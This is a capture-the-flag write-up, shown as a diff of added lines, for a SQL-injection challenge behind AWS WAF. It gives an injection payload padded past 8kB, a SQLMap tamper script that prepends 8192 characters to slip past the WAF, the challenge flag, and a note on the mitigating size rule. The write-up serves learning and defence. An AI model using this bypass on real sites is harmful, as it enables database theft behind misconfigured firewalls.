@@ -1,0 +1,89 @@
+<h1>Asuna Waffles</h1>
+
+<blockquote>
+  <p>I really love blue-berry waffles. I really do. Even Asuna loves it too! There are two users, flag is in one of the columns.\
+  \
+  http://asuna.nullsession.pw\
+  \
+  author: Gladiator</p>
+</blockquote>
+
+<p>Going to the index page, we are told that this is yet another SQL injection challenge ™️</p>
+
+<p>```http
+HTTP/1.1 200 OK
+Date: Mon, 14 Mar 2022 04:44:43 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 114
+Connection: close
+Access-Control-Allow-Headers: *
+Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: Content-Disposition
+X-Request-Id: 3dfaa711-24bc-4755-b720-4b0fbfa16335</p>
+
+<p>You can try using /search to search. Example: /search?q=bob ["SELECT * FROM user WHERE username = '"+username+"'"]
+```</p>
+
+<p>However, once we start fuzzing some classic SQLi payloads, we would quickly find that the challenge is not so simple. We are instead greeted with a 403 Forbidden page.</p>
+
+<p>```http
+HTTP/1.1 403 Forbidden
+Server: awselb/2.0
+Date: Mon, 14 Mar 2022 04:45:55 GMT
+Content-Type: text/html
+Content-Length: 520
+Connection: close</p>
+
+<p><html>
+<head><title>403 Forbidden</title></head>
+<body>
+<center><h1>403 Forbidden</h1></center>
+</body>
+</html>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+```</p>
+
+<p>One would notice, however, that the <code>Server</code> header is now present. We know that the application is put behind an AWS ELB, so we could guess that the AWS WAF is the one blocking our SQLi requests.</p>
+
+<h3>Dangerous Defaults</h3>
+
+<p>A quick look at the AWS WAF <a href="https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-fields.html">documentation</a> would sound some alarm bells with these red warning boxes:</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2022-03-14 at 12.48.58 PM.png" alt="" /></p>
+
+<p>Wait... this can't be... can it? Surely there must be some other default rule that says that anything longer than 8kB is blocked without even being passed to the WAF... right?</p>
+
+<p>Well, a simple test showed otherwise. Even a trivial payload like <code>aaa...[8kB]...aaa' or '1</code> would succeed. We could therefore dump the database using SQLi payloads longer than 8kB!</p>
+
+<p>I was too lazy to do this manually, so I just wrote a simple SQLMap tamper script that prepends 8192 <code>"a"</code>s to the payload.</p>
+
+<p>```python</p>
+
+<h1>!/usr/bin/env python</h1>
+
+<p>from lib.core.enums import PRIORITY
+import re</p>
+
+<p><strong>priority</strong> = PRIORITY.NORMAL
+def dependencies():
+    pass</p>
+
+<p>def tamper(payload, **kwargs):
+    return "a" * 8192 + payload
+```</p>
+
+<p>Dumping the database with SQLMap then gave the flag :smile:</p>
+
+<p><code>CTFSG{A_Cru3l_Summ3r_W1th_SAO_RELEASE_RECOLLECTION}</code></p>
+
+<h3>Is There a Mitigation?</h3>
+
+<p>Looking at the <a href="https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-changelog.html">managed rule groups changelog</a>, it seems the <code>SizeRestrictions_BODY</code> rule in the Core Rule Set was recently changed to block payloads larger than 8kB instead of 10kB, likely due to <a href="https://osamaelnaggar.com/blog/aws_waf_dangerous_defaults/">this blog post</a>.</p>
+
+<p>If we use the above rule together with SQLi detection, this would be mitigated. But this is not a default rule added out of the box, and a developer would likely not be aware that one has to use it in order to make their WAF effective. :thinking:</p>
